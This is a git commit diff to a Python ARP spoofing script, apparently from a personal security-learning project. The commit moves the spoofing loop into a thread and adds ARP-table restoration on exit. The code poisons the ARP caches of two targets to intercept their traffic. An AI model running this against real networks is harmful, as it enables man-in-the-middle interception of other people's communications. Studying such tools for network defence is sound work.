d0e28532dd19d068e99417066772ce4008f176ae
Ahmed Khaled <ahmedkhaledabab@gmail.com>
2020-06-28 17:36:27 +0200

    threading

--- packet-sniffer/packet_sniffer.py
+++ packet-sniffer/packet_sniffer.py
@@ -5,6 +5,9 @@ import scapy.all as scapy
 import time
 import sys
 import argparse
+import threading
+import os
+import signal
 
 def parse_command_line():
     parser = argparse.ArgumentParser()
@@ -34,26 +37,40 @@ def spoof(target_ip, spoof_ip):
 def restore(dest_ip, source_ip):
     packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=get_mac(dest_ip), psrc=source_ip, hwsrc=get_mac(source_ip))
     scapy.send(packet, count=4, verbose=False) # count=4 to make sure we cleaned things up
+    
+    os.kill(os.getpid(), signal.SIGINT)
 
+def spoof_target(target1, target2):
+    sent_packets_num = 0
+    try:
+        while True:
+            spoof(target1, target2)
+            spoof(target2, target1)
+            sent_packets_num+=2
+            #python3: print("\rPackets sent: " + str(sent_packets_num), end="")
+            #python2: 
+            print("\rPackets sent: " + str(sent_packets_num)),
+            sys.stdout.flush()
+            time.sleep(2)
+    except KeyboardInterrupt:
+        print("Cleaning up arp tables and resetting changes...")
+        restore(target2, target1)
+        restore(target1, target2)
 
-targets = parse_command_line()
-    
-sent_packets_num = 0
-try:
-    while True:
-        spoof(targets[0], targets[1])
-        spoof(targets[1], targets[0])
-        sent_packets_num+=2
-        #python3: print("\rPackets sent: " + str(sent_packets_num), end="")
-        #python2: 
-        print("\rPackets sent: " + str(sent_packets_num)),
-        sys.stdout.flush()
-        time.sleep(2)
-except KeyboardInterrupt:
-    print("Cleaning up arp tables and resetting changes...")
-    restore(targets[1], targets[0])
-    restore(targets[0], targets[1])
+def main():
+    targets = parse_command_line()
     
     
+    spoof_thread = threading.Thread(target = spoof_target, args=(targets[0], targets[1]))
+    spoof_thread.start()
+    
+    try:
+        pass
+    except KeyboardInterrupt:
+        print("Cleaning up arp tables and resetting changes...")
+        restore(targets[1], targets[0])
+        restore(targets[0], targets[1])
+        sys.exit(0)
     
     
+main()
